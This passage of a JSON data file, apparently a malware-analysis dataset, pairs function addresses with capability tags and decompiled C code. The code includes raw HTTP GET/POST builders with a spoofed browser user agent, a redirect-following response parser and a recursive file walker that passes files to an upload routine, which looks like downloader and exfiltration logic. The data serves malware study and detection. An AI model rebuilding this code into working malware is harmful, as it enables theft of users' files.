0;\n}\n",
        "token_count": 385
    },
    "00402a3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402a3e(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.004106e2(0, 0, arg_8h, arg_ch, 0, 0, 0, 0);\n    iVar2 = 0;\n    if (iVar1 != 0) {\n        arg_8h_00 = fcn.004018cf(iVar1);\n        if (arg_8h_00 != 0) {\n            iVar1 = fcn.004106e2(0, 0, arg_8h, arg_ch, arg_8h_00, iVar1, 0, 0);\n            iVar2 = arg_8h_00;\n            if (iVar1 == 0) {\n                fcn.004018b8(arg_8h_00);\n                iVar2 = 0;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 261
    },
    "00402abb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402abb(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    \n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        iVar1 = fcn.004107de(arg_8h, arg_ch, 0);\n        if (iVar1 == 0) {\n            arg_ch_00 = fcn.004018cf(arg_ch + 1);\n            fcn.00401906(arg_8h, arg_ch_00, arg_ch);\n        }\n        else {\n            arg_8h = fcn.00402a3e(arg_8h, arg_ch >> 1);\n        }\n        return arg_8h;\n    }\n    return 0;\n}\n",
        "token_count": 178
    },
    "00402b0d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402b0d(uint16_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    \n    if (arg_8h == NULL) {\n        return 0;\n    }\n    puVar3 = arg_8h;\n    if ((arg_ch & 1) == 0) {\n        do {\n            if (arg_ch == 0) {\n                return 1;\n            }\n            uVar2 = *arg_8h;\n            uVar1 = uVar2 >> 8;\n            if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                if ((uVar1 < 0x41) || (0x46 < uVar1)) {\n                    if ((uVar1 < 0x61) || (0x66 < uVar1)) {\n                        return 0;\n                    }\n                    uVar2 = uVar2 & 0xff | uVar1 + 0xa9 << 8;\n                }\n                else {\n                    uVar2 = uVar2 & 0xff | uVar1 - 0x37 << 8;\n                }\n            }\n            else {\n                uVar2 = uVar2 & 0xff | uVar1 - 0x30 << 8;\n            }\n            uVar1 = uVar2;\n            if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                if ((uVar1 < 0x41) || (0x46 < uVar1)) {\n                    if ((uVar1 < 0x61) || (0x66 < uVar1)) {\n                        return 0;\n                    }\n                    uVar2 = uVar2 & 0xff00 | uVar1 + 0xa9;\n                }\n                else {\n                    uVar2 = uVar2 & 0xff00 | uVar1 - 0x37;\n                }\n            }\n            else {\n                uVar2 = uVar2 & 0xff00 | uVar1 - 0x30;\n            }\n            *puVar3 = uVar2 << 4 | uVar2 >> 8;\n            arg_ch = arg_ch - 2;\n            arg_8h = arg_8h + 1;\n            puVar3 = puVar3 + 1;\n        } while( true );\n    }\n    return 0;\n}\n",
        "token_count": 542
    },
    "00402c01": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c15)\n// WARNING: Removing unreachable block (ram,0x00402c1f)\n// WARNING: Removing unreachable block (ram,0x00402c28)\n// WARNING: Removing unreachable block (ram,0x00402c36)\n// WARNING: Removing unreachable block (ram,0x00402c52)\n// WARNING: Removing unreachable block (ram,0x00402c70)\n// WARNING: Removing unreachable block (ram,0x00402c7a)\n// WARNING: Removing unreachable block (ram,0x00402c80)\n// WARNING: Removing unreachable block (ram,0x00402ca4)\n// WARNING: Removing unreachable block (ram,0x00402cb8)\n// WARNING: Removing unreachable block (ram,0x00402cc9)\n// WARNING: Removing unreachable block (ram,0x00402cca)\n// WARNING: Removing unreachable block (ram,0x00402cd2)\n// WARNING: Removing unreachable block (ram,0x00402cda)\n// WARNING: Removing unreachable block (ram,0x00402ce2)\n// WARNING: Removing unreachable block (ram,0x00402c31)\n\nuint fcn.00402c01(void)\n\n{\n    uint in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return in_EAX;\n}\n",
        "token_count": 309
    },
    "00402ce7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402cfe)\n// WARNING: Removing unreachable block (ram,0x00402d08)\n// WARNING: Removing unreachable block (ram,0x00402d11)\n// WARNING: Removing unreachable block (ram,0x00402d1a)\n// WARNING: Removing unreachable block (ram,0x00402d23)\n// WARNING: Removing unreachable block (ram,0x00402d28)\n// WARNING: Removing unreachable block (ram,0x00402d4f)\n// WARNING: Removing unreachable block (ram,0x00402d67)\n// WARNING: Removing unreachable block (ram,0x00402d6f)\n// WARNING: Removing unreachable block (ram,0x00402d88)\n// WARNING: Removing unreachable block (ram,0x00402db3)\n// WARNING: Removing unreachable block (ram,0x00402dbc)\n// WARNING: Removing unreachable block (ram,0x00402dd2)\n// WARNING: Removing unreachable block (ram,0x00402e43)\n// WARNING: Removing unreachable block (ram,0x00402deb)\n// WARNING: Removing unreachable block (ram,0x00402df8)\n// WARNING: Removing unreachable block (ram,0x00402e18)\n// WARNING: Removing unreachable block (ram,0x00402e21)\n// WARNING: Removing unreachable block (ram,0x00402e2d)\n// WARNING: Removing unreachable block (ram,0x00402e31)\n// WARNING: Removing unreachable block (ram,0x00402e4b)\n// WARNING: Removing unreachable block (ram,0x00402e62)\n// WARNING: Removing unreachable block (ram,0x00402e6d)\n\nuint fcn.00402ce7(void)\n\n{\n    uint in_EAX;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_12ch;\n    uint var_110h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return in_EAX;\n}\n",
        "token_count": 459
    },
    "00403800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403800(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_10h;\n    int32_t var_ch;\n    \n    iVar3 = 0;\n    iVar1 = fcn.00410838(2, 1, 6);\n    if (iVar1 != -1) {\n        fcn.004018e6(&var_10h, 0x10);\n        var_10h._0_2_ = 2;\n        var_10h._2_2_ = (arg_10h & 0xff) << 8 | arg_10h >> 8;\n        if (((arg_ch == 0) && ((arg_8h == 0 || (arg_ch = fcn.004037c6(arg_8h),  arg_ch == -1)))) ||\n           (var_ch = arg_ch,  iVar2 = fcn.0041083e(),  iVar3 = iVar1,  iVar2 == -1)) {\n            fcn.00410844(iVar1);\n            iVar3 = 0;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 289
    },
    "00403884": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403884(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_10h == 0) {\n        return 1;\n    }\n    do {\n        iVar1 = fcn.0041084a();\n        if (iVar1 < 1) {\n            return 0;\n        }\n        arg_10h = arg_10h - iVar1;\n    } while (arg_10h != 0);\n    return 1;\n}\n",
        "token_count": 120
    },
    "004039a2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004039a2(uint arg_8h, int32_t *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_800h;\n    \n    uVar3 = 0;\n    iVar1 = fcn.004038d0(arg_8h, 0x5a);\n    if (iVar1 != 0) {\n        do {\n            iVar4 = 0x5a;\n            iVar1 = fcn.004038d0(arg_8h, 0x5a);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            uVar2 = arg_10h;\n            if (0x800 < arg_10h) {\n                uVar2 = 0x800;\n            }\n            iVar1 = fcn.00410856(arg_8h, &var_800h, uVar2, 0);\n            if (iVar1 < 0) {\n                return 0;\n            }\n            if (iVar1 == 0) {\n                return 1;\n            }\n            (**(*arg_ch + 0x10))(arg_ch, &var_800h, iVar1, 0, iVar1);\n            arg_10h = arg_10h - iVar4;\n        } while (arg_10h != 0);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 330
    },
    "00403a2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403a2a(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = 0;\n    do {\n        fcn.00401047(arg_8h, iVar1, 0);\n        var_4h = 0;\n        (**(*arg_8h + 0xc))(arg_8h, &var_4h, 4, &var_8h);\n        if (var_4h == 0xa0d0a0d) {\n            return iVar1 + 4;\n        }\n        iVar1 = iVar1 + 1;\n    } while (var_8h != 0);\n    return 0;\n}\n",
        "token_count": 176
    },
    "00403a78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00403a78(uint arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004018cf(15000);\n    fcn.00401000(&fcn.00403a78::var_ch);\n    pcVar6 = NULL;\n    do {\n        iVar2 = fcn.00403930(arg_8h, var_ch, 64000, 10);\n        if ((iVar2 == 0) || (uVar3 = fcn.00401082(var_ch),  64000 < uVar3)) goto code_r0x00403be4;\n        iVar2 = fcn.00403a2a(var_ch);\n    } while (iVar2 == 0);\n    fcn.004012bb(var_ch);\n    (**(*var_ch + 0xc))(var_ch, var_4h, 0x2134, 0);\n    var_8h = 0x403b05;\n    iVar2 = fcn.00410808();\n    pcVar6 = NULL;\n    if (iVar2 != 0) {\n        var_ch = \"Content-Length:\";\n        iVar4 = fcn.0041066a();\n        pcVar6 = iVar2 + iVar4;\n        pcVar7 = pcVar6 + 1;\n        iVar2 = 0x1194;\n        pcVar9 = pcVar7;\n        do {\n            pcVar8 = pcVar9;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\r');\n        pcVar8[-1] = '\\0';\n        var_8h = fcn.00410814(pcVar7, pcVar8);\n        pcVar7[-1] = '\\r';\n    }\n    iVar2 = fcn.00410808(var_4h, \"Location:\");\n    if (iVar2 != 0) {\n        iVar4 = fcn.0041066a(\"Location:\");\n        iVar5 = 0x1194;\n        pcVar9 = iVar2 + iVar4 + 1;\n        do {\n            pcVar6 = pcVar9;\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            pcVar6 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar6;\n        } while (cVar1 != '\\r');\n        pcVar6[-1] = '\\0';\n        iVar4 = 0x403b80;\n        iVar2 = fcn.00402a1d(0x403b80);\n        if (arg_10h == NULL) {\n            fcn.004018b8(iVar2);\n        }\n        else {\n            *arg_10h = iVar2;\n            iVar2 = iVar4;\n        }\n        *(iVar2 + -1) = 0xd;\n    }\n    fcn.0040131f(var_ch);\n    if (var_8h == 0) {\n        var_8h = 0xa00000;\n    }\n    fcn.004039a2(arg_8h, var_ch, var_8h);\n    iVar2 = fcn.00401082(var_ch);\n    if (((iVar2 != 0) && (iVar2 != 0)) && (iVar2 = (**(*var_ch + 0x34))(var_ch, arg_ch),  -1 < iVar2)) {\n        pcVar6 = 0x1;\n    }\ncode_r0x00403be4:\n    (**(*var_ch + 8))(var_ch);\n    fcn.004018b8(var_4h);\n    return pcVar6;\n}\n",
        "token_count": 928
    },
    "00403bff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403bff(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_10h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint var_50h;\n    uchar *var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_4h;\n    \n    uVar2 = 0;\n    var_4h = fcn.004018cf(0x2000);\n    var_4ch = fcn.004018cf(0x2000);\n    var_44h = fcn.004018cf(0x2000);\n    puVar3 = &var_40h;\n    for (iVar1 = 0x3c; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_40h = 0x3c;\n    var_2ch = 0x1fff;\n    var_10h = 0x1fff;\n    var_30h = var_4h;\n    var_14h = var_4ch;\n    iVar1 = fcn.004107fc(arg_8h, 0, 0x80000000, &var_40h);\n    if ((iVar1 != 0) && (var_30h != 0)) {\n        var_50h = 0x1fff;\n        iVar1 = fcn.00410802(&var_40h, 0x80000000, var_44h, &var_50h);\n        if (iVar1 != 0) {\n            *var_4ch = 0;\n            puVar3 = &var_40h;\n            for (iVar1 = 0x3c; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_40h = 0x3c;\n            var_14h = var_4ch;\n            var_2ch = 0x1fff;\n            var_10h = 0x1fff;\n            iVar1 = fcn.004107fc(var_44h, 0, 0, &var_40h);\n            if ((iVar1 != 0) && (var_30h != 0)) {\n                fcn.004107ae(var_44h, \n                             \"GET %s HTTP/1.0\\r\\nHost: %s\\r\\nAccept: */*\\r\\nAccept-Encoding: identity, *;q=0\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)\\r\\n\\r\\n\"\n                             , var_4ch, var_4h);\n                iVar1 = fcn.00403800(var_4h, 0, var_28h);\n                if (iVar1 != 0) {\n                    var_48h = iVar1;\n                    arg_10h_00 = fcn.0041066a(var_44h);\n                    iVar1 = fcn.00403884(var_48h, var_44h, arg_10h_00);\n                    if (iVar1 != 0) {\n                        uVar2 = fcn.00403a78(var_48h, arg_ch, arg_10h);\n                    }\n                    fcn.00410844(var_48h);\n                }\n            }\n        }\n    }\n    fcn.004018b8(var_4ch);\n    fcn.004018b8(var_44h);\n    fcn.004018b8(var_4h);\n    return uVar2;\n}\n",
        "token_count": 892
    },
    "00403d6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403d6d(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    var_4h = 0;\n    iVar1 = fcn.00403bff(arg_8h, arg_ch, &var_4h);\n    if (var_4h != 0) {\n        fcn.00403bff(var_4h, arg_ch, 0);\n        iVar1 = var_4h;\n        fcn.004018b8(var_4h);\n    }\n    return iVar1;\n}\n",
        "token_count": 155
    },
    "00403de5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403de5(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint arg_10h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uchar *var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar *var_10h;\n    uint var_ch;\n    \n    var_54h = 0;\n    iVar2 = 0;\n    var_40h = fcn.004018cf(0x1000);\n    var_48h = fcn.004018cf(0x1000);\n    var_44h = fcn.004018cf(0x1000);\n    puVar3 = &var_3ch;\n    for (iVar1 = 0x3c; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_3ch = 0x3c;\n    var_2ch = var_40h;\n    var_10h = var_48h;\n    var_28h = 0xfff;\n    var_ch = 0xfff;\n    iVar1 = fcn.004107fc(arg_8h, 0, 0x80000000, &var_3ch);\n    if ((iVar1 != 0) && (var_2ch != 0)) {\n        var_50h = 0xfff;\n        iVar1 = fcn.00410802(&var_3ch, 0x80000000, var_44h, &var_50h);\n        if (iVar1 != 0) {\n            *var_48h = 0;\n            puVar3 = &var_3ch;\n            for (iVar1 = 0x3c; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_3ch = 0x3c;\n            var_10h = var_48h;\n            var_28h = 0xfff;\n            var_ch = 0xfff;\n            iVar1 = fcn.004107fc(var_44h, 0, 0, &var_3ch);\n            if ((iVar1 != 0) && (var_2ch != 0)) {\n                fcn.004107ae(var_44h, \n                             \"POST %s HTTP/1.0\\r\\nHost: %s\\r\\nAccept: */*\\r\\nAccept-Encoding: identity, *;q=0\\r\\nContent-Length: %lu\\r\\nConnection: close\\r\\nContent-Type: application/octet-stream\\r\\nContent-Encoding: binary\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)\\r\\n\\r\\n\"\n                             , var_48h, var_40h, arg_10h);\n                iVar1 = fcn.00403800(var_40h, 0, var_24h);\n                if (iVar1 != 0) {\n                    var_4ch = iVar1;\n                    fcn.00403db7(iVar1);\n                    arg_10h_00 = fcn.0041066a(var_44h);\n                    iVar1 = fcn.00403884(var_4ch, var_44h, arg_10h_00);\n                    if ((iVar1 != 0) &&\n                       (((arg_10h == 0 || (iVar1 = fcn.00403884(var_4ch, arg_ch, arg_10h),  iVar1 != 0)) &&\n                        (iVar2 = iVar1,  iVar1 != 0)))) {\n                        iVar2 = fcn.00403a78(var_4ch, arg_14h, &var_54h);\n                    }\n                    fcn.00410844(var_4ch);\n                }\n            }\n        }\n    }\n    fcn.004018b8(var_40h);\n    fcn.004018b8(var_44h);\n    fcn.004018b8(var_48h);\n    if (var_54h != 0) {\n        fcn.004018b8(var_54h);\n    }\n    return iVar2;\n}\n",
        "token_count": 1028
    },
    "00403f97": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f97(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_10h_00;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        iVar1 = fcn.00410790(arg_ch, &var_4h);\n        if (-1 < iVar1) {\n            arg_10h_00 = fcn.00401082(arg_ch);\n            iVar1 = fcn.00410670(var_4h);\n            if (iVar1 != 0) {\n                uVar2 = fcn.00403de5(arg_8h, iVar1, arg_10h_00, arg_10h);\n                fcn.00410676(var_4h);\n            }\n        }\n        fcn.0040129a(arg_ch);\n    }\n    return uVar2;\n}\n",
        "token_count": 235
    },
    "00404017": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404017(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    if ((arg_8h != 0) && (arg_10h != 0)) {\n        fcn.00401569(arg_8h, arg_14h);\n        fcn.0040159f(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "00404043": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404043(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        fcn.00401569(arg_8h, arg_10h);\n        fcn.004015cb(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0040406c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040406c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    arg_8h_00 = fcn.00401fb9(arg_ch);\n    if (arg_8h_00 != 0) {\n        iVar1 = fcn.00401f36(arg_8h_00);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401ffd(arg_8h_00, &var_10h);\n            if (iVar1 != 0) {\n                if (var_4h < 0x100000) {\n                    iVar1 = fcn.004023a8(var_8h, var_4h);\n                    if (iVar1 == 0) {\n                        fcn.00404017(arg_8h, var_8h, var_4h, arg_10h);\n                    }\n                }\n                fcn.00402091(&var_10h);\n            }\n        }\n        fcn.004018b8(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "004040dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004040dd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    arg_8h_00 = fcn.00401fb9(arg_ch);\n    if (arg_8h_00 != 0) {\n        iVar1 = fcn.00401f36(arg_8h_00);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401ffd(arg_8h_00, &var_10h);\n            if (iVar1 != 0) {\n                if (var_4h < 0x100000) {\n                    fcn.00404017(arg_8h, var_8h, var_4h, arg_10h);\n                }\n                fcn.00402091(&var_10h);\n            }\n        }\n        fcn.004018b8(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "0040413f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040413f(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = 0;\n    arg_8h_00 = fcn.00401fb9(arg_8h);\n    if (arg_8h_00 != 0) {\n        iVar1 = fcn.00401f36(arg_8h_00);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401ffd(arg_8h_00, &var_10h);\n            if (iVar1 != 0) {\n                if (var_4h < 0x100000) {\n                    iVar1 = fcn.004023a8(var_8h, var_4h);\n                    if (iVar1 != 0) {\n                        uVar2 = 1;\n                    }\n                }\n                fcn.00402091(&var_10h);\n            }\n        }\n        fcn.004018b8(arg_8h_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 268
    },
    "004041a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14ch\n\nvoid __cdecl fcn.004041a6(uchar *arg_8h, char *arg_ch, int32_t arg_10h, uint arg_14h, code *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h_00;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint32_t var_13eh;\n    uchar auStack278 [274];\n    \n    var_148h = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        iVar1 = fcn.004025a9(arg_ch);\n        if (iVar1 == 0) {\n            var_148h = fcn.00401df8(arg_ch, \"\\\\*.*\");\n        }\n        else {\n            var_148h = fcn.00401df8(arg_ch, 0x414f8e);\n        }\n        arg_8h_00 = 0x13e;\n        fcn.004018e6(&var_13eh, 0x13e);\n        iVar1 = fcn.0041070c(var_148h, &var_13eh);\n        if (iVar1 != -1) {\n            do {\n                if ((var_13eh & 0x10) == 0) {\n                    if ((arg_10h == 0) || (arg_8h_00 = auStack278,  iVar2 = fcn.00410808(),  iVar2 != 0)) {\n                        uVar3 = fcn.00401df8(arg_ch, 0x414845);\n                        uVar3 = fcn.00401e4c(uVar3, auStack278);\n                        if (arg_18h == NULL) {\n                            fcn.0040406c(arg_8h, uVar3, arg_14h);\n                        }\n                        else {\n                            (*arg_18h)(arg_8h, uVar3, arg_14h, uVar3);\n                        }\n                        fcn.004018b8(arg_8h_00);\n                    }\n                }\n                else {\n                    arg_8h_00 = 0x414f84;\n                    iVar2 = fcn.00410712();\n                    if (iVar2 != 0) {\n                        arg_8h_00 = 0x414f86;\n                        iVar2 = fcn.00410712();\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.004025a9(arg_ch);\n                            if (iVar2 == 0) {\n                                uVar3 = fcn.00401df8(arg_ch, 0x414845);\n                            }\n                            else {\n                                uVar3 = fcn.00401df8(arg_ch, 0);\n                            }\n                            uVar3 = fcn.00401e4c(uVar3, auStack278);\n                            arg_8h_00 = arg_8h;\n                            fcn.004041a6(arg_8h, uVar3, arg_10h, arg_14h, arg_18h);\n                            fcn.004018b8(arg_8h_00);\n                        }\n                    }\n                }\n                iVar2 = fcn.00410718(iVar1, 